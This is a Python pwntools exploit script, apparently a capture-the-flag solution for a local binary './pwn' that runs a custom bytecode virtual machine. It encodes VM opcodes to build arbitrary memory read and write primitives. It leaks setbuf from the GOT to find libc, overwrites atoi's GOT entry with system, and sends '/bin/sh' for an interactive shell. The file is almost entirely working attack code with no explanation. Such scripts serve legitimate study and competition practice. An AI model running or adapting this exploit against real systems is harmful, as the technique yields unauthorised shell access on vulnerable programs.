#!/usr/bin/env python
# encoding:utf-8

from pwn import *

'''
struct {
    int arg0,
    int arg1,
    int arg2,
    int arg3,
    int arg4,
    int arg5,
    int stack_pointer,
    int stack_base,
    void* pc,
    int flags,
    void* stack,
}
'''

def rro_mov(reg0, reg1, offset):
    '''
    mov reg0, [reg1+offset]
    '''
    return "\x01" + chr(reg0) + chr(reg1) + chr(offset)

def ror_mov(reg0, offset, reg1):
    '''
    mov [reg0+offset], reg1
    '''
    return "\x02" + chr(reg0) + chr(reg1) + chr(offset)

def ri_mov(reg, value):
    '''
    mov reg, value
    '''
    return "\x03" + chr(reg) + struct.pack("<I", value)

def rri_mov(reg0, reg1, value):
    '''
    mov [reg0+reg1], value
    '''
    return "\x04" + chr(reg0) + chr(reg1) + struct.pack("<I", value)

def putc():
    '''
    print 1 char that reg3 points to
    '''
    return "\x10\x01"

def getc():
    '''
    read 1 char into mem that reg3 points to
    '''
    return "\x10\x00"

def inc(reg):
    return "\x20" + chr(reg)

def dec(reg):
    return "\x30" + chr(reg)

def rr_add(reg0, reg1):
    return "\x40" + chr(reg0) + chr(reg1)

def ri_add(reg, value):
    return "\x43" + chr(reg) + struct.pack("<I", value)

def rr_sub(reg0, reg1):
    return "\x50" + chr(reg0) + chr(reg1)

def ri_sub(reg, value):
    return "\x53" + chr(reg) + struct.pack("<I", value)

def rr_mul(reg0, reg1):
    return "\x60" + chr(reg0) + chr(reg1)

def ri_mul(reg, value):
    return "\x63" + chr(reg) + struct.pack("<I", value)

def r_push(reg):
    return "\x70" + chr(reg)

def i_push(value):
    return "\x73" + struct.pack("<I", value)

def pop(reg):
    return "\x80" + chr(reg)

def inc_pc():
    return "\x90"

def ir_and(reg, value):
    return "\xA3" + chr(reg) + struct.pack("<I", value)

def rr_and(reg0, reg1):
    return "\xA0" + chr(reg0) + chr(reg1)

def halt():
    return "\xB0"

def jmp(offset):
    return "\xC0" + chr(offset)

def je(offset):
    return "\xE0" + chr(offset)

def rr_cmp(reg0, reg1):
    return "\xD0" + chr(reg0) + chr(reg1)

def ri_cmp(reg, value):
    return "\xD3" + chr(reg) + struct.pack("<I", value)

def jne(offset):
    return "\xF1" + chr(offset)

def jg(offset):
    return "\xF2" + chr(offset)

def jl(offset):
    return "\xF3" + chr(offset)

def jge(offset):
    return "\xF4" + chr(offset)

def jle(offset):
    return "\xF5" + chr(offset)

def jg(offset):
    return "\xF7" + chr(offset)

class AssemblyBuilder:
    def __init__(self):
        self.instructions = []
    
    def append(self, instruction):
        self.instructions.append(instruction)

    def assemble(self):
        return str("".join(self.instructions))

def menu_new(data):
    io.readuntil(">>> ")
    io.sendline("1")
    io.sendline(data)

def menu_play():
    io.readuntil(">>> ")
    io.sendline("2")

def menu_del():
    io.readuntil(">>> ")
    io.sendline("3")

def menu_exit():
    io.readuntil(">>> ")
    io.sendline("4")

def mem_read(address, length=4):
    builder = AssemblyBuilder()
    builder.append(ri_mov(3, address))
    for i in range(length):
        builder.append(putc())
        builder.append(inc(3))
    builder.append(halt())
    code = builder.assemble()
    menu_del()
    menu_new(code)
    menu_play()
    data = io.read(length)
    assert len(data) == length
    return data

def mem_write(address, data):
    builder = AssemblyBuilder()
    builder.append(ri_mov(3, address))
    for i in range(len(data)):
        builder.append(getc())
        builder.append(inc(3))
    builder.append(halt())
    code = builder.assemble()
    menu_del()
    menu_new(code)
    menu_play()
    for i in data:
        io.send(i)

filename = "./pwn"
io = process(filename)
elf = ELF(filename)
libc = ELF("/lib32/libc.so.6")

elf.address = 0x8048000

setbuf = u32(mem_read(elf.got["setbuf"]))
libc.address = setbuf - libc.symbols["setbuf"]
print("libc: %x" % (libc.address))

system_addr = libc.symbols["system"]
print("system: %x" % system_addr)

mem_write(elf.got["atoi"], p32(system_addr))
io.sendline("/bin/sh")
io.interactive()
